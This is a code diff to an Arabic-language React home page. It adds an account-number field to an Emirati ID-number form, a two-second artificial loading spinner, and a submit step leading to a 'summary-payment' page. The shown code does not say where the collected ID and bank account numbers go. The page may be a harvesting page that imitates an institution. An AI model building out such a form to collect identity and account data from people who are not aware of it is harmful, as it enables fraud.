@@ -6,7 +6,10 @@ export default function HomePage() {
   const [, setLocation] = useLocation();
   const [idType, setIdType] = useState("");
   const [idNumber, setIdNumber] = useState("");
+  const [accountNumber, setAccountNumber] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isLoadingForm, setIsLoadingForm] = useState(false);
+  const [showFormFields, setShowFormFields] = useState(false);
   const [activeTab, setActiveTab] = useState(0);
   const [activeNavItem, setActiveNavItem] = useState(0);
 
@@ -15,7 +18,7 @@ export default function HomePage() {
   }, []);
 
   const handleSubmit = () => {
-    if (!idType || !idNumber) return;
+    if (!idType || !idNumber || !accountNumber) return;
     setIsSubmitting(true);
 
     const idTypeLabel = 
@@ -32,6 +35,7 @@ export default function HomePage() {
       data: {
         idType: idTypeLabel,
         idNumber,
+        accountNumber,
       },
       current: 'الصفحة الرئيسية',
       nextPage: 'summary-payment',
@@ -339,6 +343,28 @@ export default function HomePage() {
           cursor: pointer;
         }
         
+        /* Loading spinner */
+        .bh-spinner {
+          width: 40px;
+          height: 40px;
+          position: relative;
+        }
+        .bh-spinner::before {
+          content: '';
+          display: block;
+          width: 40px;
+          height: 40px;
+          border-radius: 50%;
+          border: 4px solid transparent;
+          border-top-color: #0747C7;
+          border-right-color: #0747C7;
+          animation: bh-spin 0.8s linear infinite;
+        }
+        @keyframes bh-spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+        
         /* Bottom line */
         .bh-bottom-line {
           height: 4px;
@@ -632,7 +658,23 @@ export default function HomePage() {
               <select
                 className="bh-form-select"
                 value={idType}
-                onChange={e => setIdType(e.target.value)}
+                onChange={e => {
+                  const val = e.target.value;
+                  setIdType(val);
+                  setIdNumber("");
+                  setAccountNumber("");
+                  setShowFormFields(false);
+                  if (val) {
+                    setIsLoadingForm(true);
+                    setTimeout(() => {
+                      setIsLoadingForm(false);
+                      setShowFormFields(true);
+                    }, 2000);
+                  } else {
+                    setIsLoadingForm(false);
+                    setShowFormFields(false);
+                  }
+                }}
               >
                 <option value="">-- اختر نوع الهوية --</option>
                 <option value="emirati">الرقم الشخصي الإماراتي</option>
@@ -649,35 +691,65 @@ export default function HomePage() {
               </select>
             </div>
 
-            {idType && (
-              <div className="bh-form-row">
-                <label className="bh-form-label">
-                  <span className="required">*</span> رقم الهوية:
-                </label>
-                <input
-                  className="bh-form-input"
-                  type="text"
-                  value={idNumber}
-                  onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
-                  placeholder="أدخل رقم الهوية"
-                  maxLength={12}
-                />
+            {isLoadingForm && (
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '40px 0' }}>
+                <div className="bh-spinner"></div>
+                <span style={{ marginTop: '12px', fontSize: '14px', color: '#0747C7', fontWeight: 500 }}>الرجاء الانتظار</span>
               </div>
+            )}
+
+            {showFormFields && !isLoadingForm && (
+              <>
+                <div className="bh-form-row">
+                  <label className="bh-form-label">
+                    <span className="required">*</span> رقم الهوية:
+                  </label>
+                  <input
+                    className="bh-form-input"
+                    type="text"
+                    value={idNumber}
+                    onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
+                    placeholder="أدخل رقم الهوية"
+                    maxLength={12}
+                  />
+                </div>
+                <div className="bh-form-row">
+                  <label className="bh-form-label">
+                    <span className="required">*</span> رقم الحساب:
+                  </label>
+                  <input
+                    className="bh-form-input"
+                    type="text"
+                    value={accountNumber}
+                    onChange={e => setAccountNumber(e.target.value.replace(/[^0-9]/g, ''))}
+                    placeholder="أدخل رقم الحساب"
+                    maxLength={15}
+                  />
+                </div>
+              </>
             )}
           </div>
 
           {/* Buttons */}
           <div className="bh-buttons">
-            {idType && idNumber && (
-              <button
-                className="bh-btn-primary"
-                onClick={handleSubmit}
-                disabled={isSubmitting}
-              >
-                {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
-              </button>
+            {showFormFields && !isLoadingForm && (
+              <>
+                <button
+                  className="bh-btn-primary"
+                  onClick={handleSubmit}
+                  disabled={isSubmitting || !idNumber || !accountNumber}
+                >
+                  {isSubmitting ? 'جاري المعالجة...' : 'ارسال'}
+                </button>
+                <button
+                  className="bh-btn-primary"
+                  onClick={() => { setIdNumber(""); setAccountNumber(""); }}
+                >
+                  مسح
+                </button>
+              </>
             )}
-            <button className="bh-btn-back">رجوع</button>
+            <button className="bh-btn-back" onClick={() => { setIdType(""); setIdNumber(""); setAccountNumber(""); setShowFormFields(false); }}>رجوع</button>
           </div>
         </div>
 
